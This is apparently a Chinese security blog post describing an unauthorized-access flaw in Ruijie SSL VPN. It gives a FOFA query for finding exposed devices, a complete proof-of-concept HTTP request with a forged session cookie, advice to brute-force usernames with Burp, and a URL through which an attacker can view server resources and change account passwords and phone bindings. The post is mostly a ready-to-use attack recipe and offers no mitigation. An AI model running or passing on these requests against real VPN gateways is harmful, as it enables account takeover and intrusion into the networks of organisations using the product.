#  锐捷-SSL-VPN-越权访问漏洞   
骇客安全  骇客安全   2025-01-19 19:00  
  
## 漏洞描述  
  
Ruijie SSL VPN 存在越权访问漏洞，攻击者在已知用户名的情况下，可以对账号进行修改密码和绑定手机的操作。并在未授权的情况下查看服务器资源  
  
## 漏洞影响  
```
Ruijie SSL VPN
```  
## FOFA  
```
icon_hash="884334722" || title="Ruijie SSL VPN"
```  
## 漏洞复现  
  
访问目标   
http://xxx.xxx.xxx.xxx/cgi-bin/installjava.cgi  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991PEWKXnS6E5dmcAISUe2WnpNLDVKGn0wZIEdGH37K39YqPgCOEA8iaL9wia8jT9wkJukCyjPhYFgCBg/640?wx_fmt=png&from=appmsg "null")  
  
POC请求包如下  
```
GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1
Host: xxx.xxx.xxx.xxx
Connection: close
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1
```  
  
其中注意的参数为  
```
Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1
```  
  
UserName 参数为已知用户名  
  
在未知登录用户名的情况下 漏洞无法利用(根据请求包使用Burp进行用户名爆破)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991PEWKXnS6E5dmcAISUe2WnpkVdVeQ0jMzRtolO45ObUwCIKRZajlEMfPIqHeP2tbNCFHcYSOOiaYPg/640?wx_fmt=png&from=appmsg "null")  
  
用户名正确时会返回敏感信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991PEWKXnS6E5dmcAISUe2WnpsHibugUXLibBocUKPmtBuOQC3xmQKuJPTUMafSUuXlcCkbnAVmpxatiaw/640?wx_fmt=png&from=appmsg "null")  
  
通过此方法知道用户名后可以通过漏洞修改账号参数  
  
访问   
http://xxx.xxx.xxx.xxx/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=liuw&sid=1&oper=showres  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991PEWKXnS6E5dmcAISUe2WnpibuS4JPyZhqzXIn9GpzyD4KE6UVTibIyDnDjdMZlfqrkqjrXuiboCw1kw/640?wx_fmt=png&from=appmsg "null")  
  
点击个人设置跳转页面即可修改账号信息  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991PEWKXnS6E5dmcAISUe2WnpTicb6hTxM2dvucPdsgD8ON48AhUuSib4BvasxPBBPLJ6ibicpJPJNrj2pA/640?wx_fmt=png&from=appmsg "null")  
  
  
